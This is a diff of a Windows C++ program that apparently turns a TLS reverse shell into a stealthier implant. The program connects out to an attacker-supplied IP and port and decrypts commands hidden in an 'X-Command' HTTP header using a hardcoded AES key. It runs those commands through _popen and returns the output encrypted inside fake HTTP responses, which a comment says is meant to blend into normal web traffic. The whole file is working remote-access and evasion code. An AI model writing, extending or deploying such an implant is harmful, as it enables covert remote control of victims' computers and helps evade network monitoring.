@@ -2,28 +2,27 @@
 #include <windows.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
+#include <vector>
+#include <stdexcept>
 #include <stdio.h>
-#include<iostream>
-#pragma comment(lib,"WS2_32")
-#pragma comment (lib, "crypt32")
-#pragma warning(disable:4996) 
-WSADATA wsaData;
-SOCKET wSock;
-struct sockaddr_in hax;
+#include "AES_CBC.h"
+#include <iostream>
+#include <string>
+#include <sstream>
+#pragma comment(lib, "WS2_32")
+#pragma comment(lib, "crypt32")
 
-void InitializeSSL()
-{
+// Initialize OpenSSL
+void InitializeSSL() {
     SSL_load_error_strings();
     OpenSSL_add_ssl_algorithms();
 }
 
-SSL_CTX* CreateSSLContext()
-{
-    const SSL_METHOD* method;
-    SSL_CTX* ctx;
+// Create an SSL context
+SSL_CTX* CreateSSLContext() {
+    const SSL_METHOD* method = TLS_client_method();
+    SSL_CTX* ctx = SSL_CTX_new(method);
 
-    method = TLS_client_method();  // Use TLS method for secure communication
-    ctx = SSL_CTX_new(method);
     if (!ctx) {
         perror("Unable to create SSL context");
         ERR_print_errors_fp(stderr);
@@ -33,94 +32,136 @@ SSL_CTX* CreateSSLContext()
     return ctx;
 }
 
-void CleanupSSL()
-{
+// Clean up OpenSSL
+void CleanupSSL() {
     EVP_cleanup();
 }
 
-int main(int argc, char* argv[]) {
-    // Initialize Winsock
-    WSADATA wsaData;
+// Parse the "X-Command" header from the HTTP request
+std::string ExtractCommand(const std::string& request) {
+    std::string header = "X-Command: ";
+    size_t pos = request.find(header);
+    if (pos != std::string::npos) {
+        size_t end_pos = request.find("\r\n", pos);
+        return request.substr(pos + header.length(), end_pos - pos - header.length());
+    }
+    return "";
+}
 
-    // listener ip, port on attacker's machine as arguments
+int main(int argc, char* argv[]) {
     if (argc != 3) {
         std::cerr << "Usage: " << argv[0] << " <ATTACKER_IP> <ATTACKER_PORT>" << std::endl;
         return 1;
     }
 
-    // Get arguments
     char* ATTACKER_IP = argv[1];
     short ATTACKER_PORT = static_cast<short>(std::atoi(argv[2]));
 
-    // Validate input (optional, basic checks)
     if (ATTACKER_PORT <= 0 || ATTACKER_PORT > 65535) {
         std::cerr << "Error: Port must be between 1 and 65535." << std::endl;
         return 1;
     }
 
+    WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
 
-    // Create a socket
     SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == INVALID_SOCKET) {
         printf("Socket creation failed: %d\n", WSAGetLastError());
         return 1;
     }
 
-    // Set up the sockaddr_in structure
     struct sockaddr_in server;
     server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
     server.sin_family = AF_INET;
     server.sin_port = htons(ATTACKER_PORT);
 
-    // Connect to the attacker
     if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
         printf("Connection failed: %d\n", WSAGetLastError());
         return 1;
     }
 
-    // Initialize OpenSSL
     InitializeSSL();
     SSL_CTX* ctx = CreateSSLContext();
 
-    // Create an SSL structure and attach it to the socket
     SSL* ssl = SSL_new(ctx);
     SSL_set_fd(ssl, sock);
 
-    // Perform the SSL handshake
     if (SSL_connect(ssl) <= 0) {
         ERR_print_errors_fp(stderr);
     }
     else {
         printf("Connected with %s encryption\n", SSL_get_cipher(ssl));
 
-        // Send and receive data through the SSL connection
-        char command[1024];
-        while (1) {
-            // Receive command from the attacker
-            int bytes = SSL_read(ssl, command, sizeof(command));
+        char buffer[4096];
+        while (true) {
+            int bytes = SSL_read(ssl, buffer, sizeof(buffer) - 1);
             if (bytes > 0) {
-                command[bytes] = '\0';
-                printf("Received command: %s\n", command);
+                buffer[bytes] = '\0';
+                printf("[+] Received request:\n%s\n", buffer);
 
-                // Execute the command and capture the output
-                FILE* fp = _popen(command, "r");
-                if (fp == NULL) {
-                    printf("Failed to run command\n");
-                    break;
-                }
+                std::string request(buffer);
+                std::string command = ExtractCommand(request);
 
-                char result[1024];
-                while (fgets(result, sizeof(result), fp) != NULL) {
-                    // Send the result back to the attacker
-                    SSL_write(ssl, result, strlen(result));
+                // Encryption key (16 bytes for AES-128)
+                unsigned char key[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0x6d, 0x29, 0x58, 0x41, 0x60, 0x74, 0x5c, 0x3e, 0x7b, 0x71, 0x3a };
+
+                // Fixed IV (16 bytes for AES-128)
+                unsigned char iv[16] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
+
+                // Create an AES_CBC object with the key and fixed IV
+                AES_CBC aes(key, iv);
+
+                std::string decryptedCommand = decryptCommand(command, aes);
+
+                if (!decryptedCommand.empty()) {
+                    printf("[+] Executing command: %s\n", decryptedCommand.c_str());
+
+                    FILE* fp = _popen(decryptedCommand.c_str(), "r");
+                    if (!fp) {
+                        printf("[-] Failed to execute command\n");
+                        break;
+                    }
+
+                    std::ostringstream response;
+                    char result[1024];
+                    while (fgets(result, sizeof(result), fp) != NULL) {
+                        response << result;
+                    }
+                    _pclose(fp);
+
+                    printf("[+] response: %s\n", result);
+
+                    // Encrypt the response using AES
+                    std::string encryptedResponse = encryptCommand(response.str(), aes);
+
+                    // Add response to http headers to blend in http traffic
+                    std::ostringstream httpResponse;
+                    httpResponse << "HTTP/1.1 200 OK\r\n"
+                        << "Content-Type: text/plain\r\n"
+                        << "Content-Length: " << encryptedResponse.length() << "\r\n\r\n"
+                        << encryptedResponse;
+
+                    // Print the encrypted data in hex
+                    std::cout << "Encrypted data: " << encryptedResponse << std::endl;
+
+                    // Output buffer for decryption
+                    std::string decryptedResponse = decryptCommand(encryptedResponse, aes);
+
+                    // Print the decrypted data
+                    std::cout << "Decrypted data: " << std::endl;
+                    std::cout << decryptedResponse << std::endl;
+
+                    SSL_write(ssl, httpResponse.str().c_str(), httpResponse.str().length());
                 }
-                _pclose(fp);
+                else {
+                    printf("[-] No valid command found in headers\n");
+                }
             }
+
         }
     }
 
-    // Clean up
     SSL_free(ssl);
     closesocket(sock);
     SSL_CTX_free(ctx);
